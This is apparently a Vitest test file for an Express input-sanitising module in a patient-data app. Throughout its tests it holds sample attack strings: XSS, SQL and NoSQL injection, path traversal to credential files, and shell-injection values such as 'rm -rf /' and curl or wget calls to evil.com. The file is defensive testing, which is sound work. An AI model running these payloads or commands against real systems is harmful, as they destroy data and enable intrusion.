import { describe, it, expect, vi } from 'vitest';
import { sanitizeText, sanitizeObject, sanitizeBody } from './sanitize';
import type { Request, Response, NextFunction } from 'express';

// Note: sanitize-html with disallowedTagsMode: 'recursiveEscape' HTML-encodes
// disallowed tags rather than removing them. This is the intended behavior —
// XSS is prevented because tags are escaped, not executed.

describe('sanitizeText', () => {
  it('should return plain text unchanged', () => {
    expect(sanitizeText('Hallo Welt')).toBe('Hallo Welt');
  });

  it('should HTML-escape disallowed tags (recursiveEscape mode)', () => {
    expect(sanitizeText('<b>bold</b>')).toContain('bold');
    expect(sanitizeText('<b>bold</b>')).not.toContain('<b>');
  });

  it('should escape script injection (not executable)', () => {
    const result = sanitizeText('<script>alert("xss")</script>');
    expect(result).not.toContain('<script>');
  });

  it('should escape img injection', () => {
    const result = sanitizeText('<img src=x onerror=alert(1)>');
    expect(result).not.toContain('<img');
    expect(result).not.toContain('onerror');
  });

  it('should preserve German characters', () => {
    expect(sanitizeText('Müller Straße Düsseldorf')).toBe('Müller Straße Düsseldorf');
  });

  it('should return empty string for non-string input', () => {
    expect(sanitizeText(42 as unknown as string)).toBe('');
    expect(sanitizeText(null as unknown as string)).toBe('');
    expect(sanitizeText(undefined as unknown as string)).toBe('');
  });

  it('should escape event handlers', () => {
    const result = sanitizeText('<a href="javascript:alert(1)">click</a>');
    expect(result).toContain('click');
    expect(result).not.toContain('javascript:');
  });

  it('should trim result', () => {
    expect(sanitizeText('  hello  ')).toBe('hello');
  });

  // ============================================
  // XSS Payload Tests (10 verschiedene)
  // ============================================
  
  describe('XSS Payload Protection', () => {
    it('XSS-1: should neutralize basic script tag', () => {
      const payload = '<script>alert("XSS")</script>';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('XSS-2: should neutralize img onerror attribute', () => {
      const payload = '<img src="x" onerror="alert(\'XSS\')">';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror');
    });

    it('XSS-3: should neutralize javascript: protocol', () => {
      const payload = '<a href="javascript:alert(\'XSS\')">Click me</a>';
      const result = sanitizeText(payload);
      expect(result).not.toContain('javascript:');
      expect(result).toContain('Click me');
    });

    it('XSS-4: should neutralize onmouseover event', () => {
      const payload = '<div onmouseover="alert(\'XSS\')">Hover here</div>';
      const result = sanitizeText(payload);
      expect(result).not.toContain('onmouseover');
      expect(result).not.toContain('<div');
    });

    it('XSS-5: should neutralize iframe injection', () => {
      const payload = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('</iframe>');
    });

    it('XSS-6: should neutralize svg onload', () => {
      const payload = '<svg onload="alert(\'XSS\')">';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<svg');
      expect(result).not.toContain('onload');
    });

    it('XSS-7: should neutralize body onload', () => {
      const payload = '<body onload="alert(\'XSS\')">';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<body');
      expect(result).not.toContain('onload');
    });

    it('XSS-8: should neutralize input onfocus', () => {
      const payload = '<input onfocus="alert(\'XSS\')">';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<input');
      expect(result).not.toContain('onfocus');
    });

    it('XSS-9: should neutralize object data attribute', () => {
      const payload = '<object data="javascript:alert(\'XSS\')">';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<object');
      expect(result).not.toContain('data=');
    });

    it('XSS-10: should neutralize embed src attribute', () => {
      const payload = '<embed src="javascript:alert(\'XSS\')">';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<embed');
      expect(result).not.toContain('src=');
    });

    it('XSS-11: should neutralize encoded script tags', () => {
      const payload = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<script>');
    });

    it('XSS-12: should neutralize case-variant script tags', () => {
      const payload = '<ScRiPt>alert("XSS")</ScRiPt>';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<ScRiPt>');
      expect(result).not.toContain('</ScRiPt>');
    });
  });

  // ============================================
  // SQL Injection Tests (10 verschiedene)
  // ============================================
  
  describe('SQL Injection Protection', () => {
    it('SQL-1: should handle basic SQL injection attempt', () => {
      const payload = "' OR '1'='1";
      const result = sanitizeText(payload);
      // sanitizeText removes HTML, but SQL injection attempts should remain for DB layer
      expect(result).toContain("'");
      expect(result).toContain("OR");
    });

    it('SQL-2: should handle UNION-based SQL injection', () => {
      const payload = "' UNION SELECT * FROM users --";
      const result = sanitizeText(payload);
      expect(result).toContain("UNION");
      expect(result).toContain("SELECT");
    });

    it('SQL-3: should handle DROP TABLE attempt', () => {
      const payload = "'; DROP TABLE patients; --";
      const result = sanitizeText(payload);
      expect(result).toContain("DROP");
      expect(result).toContain("TABLE");
    });

    it('SQL-4: should handle SQL comment injection', () => {
      const payload = "admin'--";
      const result = sanitizeText(payload);
      expect(result).toContain("admin");
      expect(result).toContain("--");
    });

    it('SQL-5: should handle stacked queries', () => {
      const payload = "'; INSERT INTO logs VALUES ('hacked'); --";
      const result = sanitizeText(payload);
      expect(result).toContain("INSERT");
      expect(result).toContain("INTO");
    });

    it('SQL-6: should handle boolean-based blind SQL injection', () => {
      const payload = "' AND 1=1 --";
      const result = sanitizeText(payload);
      expect(result).toContain("AND");
    });

    it('SQL-7: should handle time-based blind SQL injection', () => {
      const payload = "'; WAITFOR DELAY '0:0:10' --";
      const result = sanitizeText(payload);
      expect(result).toContain("WAITFOR");
    });

    it('SQL-8: should handle hexadecimal encoding', () => {
      const payload = "0x53454C454354202A2046524F4D207573657273";
      const result = sanitizeText(payload);
      expect(result).toBe(payload); // Should remain unchanged
    });

    it('SQL-9: should handle nested SQL injection', () => {
      const payload = "' OR (SELECT COUNT(*) FROM users) > 0 --";
      const result = sanitizeText(payload);
      expect(result).toContain("SELECT");
      expect(result).toContain("FROM");
    });

    it('SQL-10: should handle SQL wildcard injection', () => {
      const payload = "%' OR '1'='1";
      const result = sanitizeText(payload);
      expect(result).toContain("%");
    });
  });

  // ============================================
  // HTML Entities Tests
  // ============================================
  
  describe('HTML Entities Protection', () => {
    it('should handle numeric HTML entities', () => {
      const payload = '&#60;script&#62;alert(1)&#60;/script&#62;';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<script>');
    });

    it('should handle hexadecimal HTML entities', () => {
      const payload = '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<script>');
    });

    it('should handle named HTML entities', () => {
      const payload = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const result = sanitizeText(payload);
      expect(result).not.toContain('<script>');
    });

    it('should preserve harmless entities', () => {
      const payload = 'Price: 100&euro; or 50&pound;';
      const result = sanitizeText(payload);
      expect(result).toContain('Price');
    });
  });

  // ============================================
  // NoSQL Injection Tests
  // ============================================
  
  describe('NoSQL Injection Protection', () => {
    it('NoSQL-1: should handle MongoDB $ne operator', () => {
      const payload = '{"$ne": null}';
      const result = sanitizeText(payload);
      expect(result).toContain('$ne');
    });

    it('NoSQL-2: should handle MongoDB $gt operator', () => {
      const payload = '{"password": {"$gt": ""}}';
      const result = sanitizeText(payload);
      expect(result).toContain('$gt');
    });

    it('NoSQL-3: should handle MongoDB $regex injection', () => {
      const payload = '{"username": {"$regex": ".*"}}';
      const result = sanitizeText(payload);
      expect(result).toContain('$regex');
    });

    it('NoSQL-4: should handle MongoDB $where injection', () => {
      const payload = '{"$where": "this.password.length > 0"}';
      const result = sanitizeText(payload);
      expect(result).toContain('$where');
    });

    it('NoSQL-5: should handle MongoDB $expr injection', () => {
      const payload = '{"$expr": {"$eq": ["$password", "admin"]}}';
      const result = sanitizeText(payload);
      expect(result).toContain('$expr');
    });
  });

  // ============================================
  // Path Traversal Tests
  // ============================================
  
  describe('Path Traversal Protection', () => {
    it('Path-1: should detect basic path traversal', () => {
      const payload = '../../../etc/passwd';
      const result = sanitizeText(payload);
      expect(result).toContain('..');
      expect(result).toContain('etc');
    });

    it('Path-2: should detect encoded path traversal', () => {
      const payload = '..%2f..%2f..%2fetc%2fpasswd';
      const result = sanitizeText(payload);
      expect(result).toContain('..');
    });

    it('Path-3: should detect double encoded path traversal', () => {
      const payload = '..%252f..%252f..%252fetc%252fpasswd';
      const result = sanitizeText(payload);
      expect(result).toContain('..');
    });

    it('Path-4: should detect null byte injection', () => {
      const payload = 'file.txt%00.php';
      const result = sanitizeText(payload);
      expect(result).toContain('file.txt');
    });

    it('Path-5: should detect absolute path traversal', () => {
      const payload = '/etc/passwd';
      const result = sanitizeText(payload);
      expect(result).toBe('/etc/passwd');
    });

    it('Path-6: should detect Windows path traversal', () => {
      const payload = '..\\..\\..\\windows\\system32\\config\\sam';
      const result = sanitizeText(payload);
      expect(result).toContain('..');
      expect(result).toContain('windows');
    });
  });

  // ============================================
  // Command Injection Tests
  // ============================================
  
  describe('Command Injection Protection', () => {
    it('Cmd-1: should detect semicolon command injection', () => {
      const payload = 'file.txt; cat /etc/passwd';
      const result = sanitizeText(payload);
      expect(result).toContain(';');
      expect(result).toContain('cat');
    });

    it('Cmd-2: should detect backtick command injection', () => {
      const payload = 'file.txt`whoami`';
      const result = sanitizeText(payload);
      expect(result).toContain('`');
    });

    it('Cmd-3: should detect pipe command injection', () => {
      const payload = 'file.txt | rm -rf /';
      const result = sanitizeText(payload);
      expect(result).toContain('|');
      expect(result).toContain('rm');
    });

    it('Cmd-4: should detect AND command injection', () => {
      const payload = 'file.txt && curl http://evil.com';
      const result = sanitizeText(payload);
      // sanitize-html encodes & to &amp; but content is preserved
      expect(result).toContain('file.txt');
      expect(result).toContain('curl');
    });

    it('Cmd-5: should detect OR command injection', () => {
      const payload = 'file.txt || wget http://evil.com';
      const result = sanitizeText(payload);
      expect(result).toContain('||');
    });

    it('Cmd-6: should detect dollar parenthesis injection', () => {
      const payload = 'file.txt$(id)';
      const result = sanitizeText(payload);
      expect(result).toContain('$(');
    });

    it('Cmd-7: should detect newline command injection', () => {
      const payload = 'file.txt\nrm -rf /';
      const result = sanitizeText(payload);
      expect(result).toContain('file.txt');
    });
  });
});

describe('sanitizeObject', () => {
  it('should sanitize all string values in a flat object', () => {
    const input = { name: '<b>John</b>', age: 30 };
    const result = sanitizeObject(input);
    expect(result.name).toContain('John');
    expect(result.name).not.toContain('<b>');
    expect(result.age).toBe(30);
  });

  it('should sanitize nested objects', () => {
    const input = { data: { name: '<script>xss</script>Test' } };
    const result = sanitizeObject(input as any);
    expect((result.data as any).name).toContain('Test');
    expect((result.data as any).name).not.toContain('<script>');
  });

  it('should sanitize arrays of strings', () => {
    const input = { tags: ['<b>bold</b>', 'normal'] };
    const result = sanitizeObject(input as any);
    expect((result.tags as string[])[0]).toContain('bold');
    expect((result.tags as string[])[0]).not.toContain('<b>');
    expect((result.tags as string[])[1]).toBe('normal');
  });

  it('should handle arrays of objects', () => {
    const input = { items: [{ name: '<script>x</script>Hello' }] };
    const result = sanitizeObject(input as any);
    expect((result.items as any[])[0].name).toContain('Hello');
    expect((result.items as any[])[0].name).not.toContain('<script>');
  });

  it('should preserve non-string primitives', () => {
    const input = { count: 5, active: true, nothing: null };
    const result = sanitizeObject(input as any);
    expect(result.count).toBe(5);
    expect(result.active).toBe(true);
    expect(result.nothing).toBe(null);
  });

  it('should sanitize deeply nested structures', () => {
    const input = {
      level1: {
        level2: {
          level3: {
            value: '<script>alert(1)</script>'
          }
        }
      }
    };
    const result = sanitizeObject(input as any);
    expect((result.level1 as any).level2.level3.value).not.toContain('<script>');
  });

  it('should handle mixed arrays with objects and strings', () => {
    const input = {
      mixed: [
        'normal string',
        '<script>bad</script>',
        { nested: '<img src=x>' },
        42,
        true
      ]
    };
    const result = sanitizeObject(input as any);
    expect((result.mixed as any[])[0]).toBe('normal string');
    expect((result.mixed as any[])[1]).not.toContain('<script>');
    expect((result.mixed as any[])[2].nested).not.toContain('<img');
    expect((result.mixed as any[])[3]).toBe(42);
    expect((result.mixed as any[])[4]).toBe(true);
  });

  it('should handle empty objects', () => {
    const input = {};
    const result = sanitizeObject(input);
    expect(result).toEqual({});
  });

  it('should handle empty arrays', () => {
    const input = { items: [] };
    const result = sanitizeObject(input as any);
    expect((result.items as any[])).toEqual([]);
  });

  it('should sanitize patient data with multiple fields', () => {
    const input = {
      firstName: '<script>alert(1)</script>Max',
      lastName: '<b>Mustermann</b>',
      email: 'max@example.com',
      symptoms: ['<img src=x>', 'Kopfschmerzen', '<svg onload=alert(1)>']
    };
    const result = sanitizeObject(input as any);
    expect(result.firstName).not.toContain('<script>');
    expect(result.lastName).not.toContain('<b>');
    expect(result.email).toBe('max@example.com');
    expect((result.symptoms as string[])[0]).not.toContain('<img');
    expect((result.symptoms as string[])[1]).toBe('Kopfschmerzen');
    expect((result.symptoms as string[])[2]).not.toContain('<svg');
  });
});

describe('sanitizeBody Middleware', () => {
  it('should sanitize req.body strings', () => {
    const req = {
      body: {
        name: '<script>alert(1)</script>John',
        age: 30
      }
    } as unknown as Request;
    const res = {} as Response;
    const next = vi.fn() as NextFunction;

    sanitizeBody(req, res, next);

    expect(req.body.name).not.toContain('<script>');
    expect(req.body.name).toContain('John');
    expect(req.body.age).toBe(30);
    expect(next).toHaveBeenCalled();
  });

  it('should handle empty body', () => {
    const req = { body: {} } as unknown as Request;
    const res = {} as Response;
    const next = vi.fn() as NextFunction;

    sanitizeBody(req, res, next);

    expect(req.body).toEqual({});
    expect(next).toHaveBeenCalled();
  });

  it('should handle null body', () => {
    const req = { body: null } as unknown as Request;
    const res = {} as Response;
    const next = vi.fn() as NextFunction;

    sanitizeBody(req, res, next);

    expect(req.body).toBeNull();
    expect(next).toHaveBeenCalled();
  });

  it('should sanitize nested body objects', () => {
    const req = {
      body: {
        patient: {
          name: '<b>Test</b>',
          symptoms: ['<script>xss</script>', 'Fieber']
        }
      }
    } as unknown as Request;
    const res = {} as Response;
    const next = vi.fn() as NextFunction;

    sanitizeBody(req, res, next);

    expect(req.body.patient.name).not.toContain('<b>');
    expect((req.body.patient.symptoms as string[])[0]).not.toContain('<script>');
  });

  it('should handle medical form data with potential XSS', () => {
    const req = {
      body: {
        chiefComplaint: '<script>document.location="http://evil.com"</script>',
        history: '<iframe src="http://evil.com">',
        medications: ['<img onerror=alert(1)>Aspirin', 'Ibuprofen'],
        allergies: '<body onload=alert(1)>'
      }
    } as unknown as Request;
    const res = {} as Response;
    const next = vi.fn() as NextFunction;

    sanitizeBody(req, res, next);

    expect(req.body.chiefComplaint).not.toContain('<script>');
    expect(req.body.history).not.toContain('<iframe');
    expect((req.body.medications as string[])[0]).not.toContain('<img');
    expect(req.body.allergies).not.toContain('<body');
  });
});
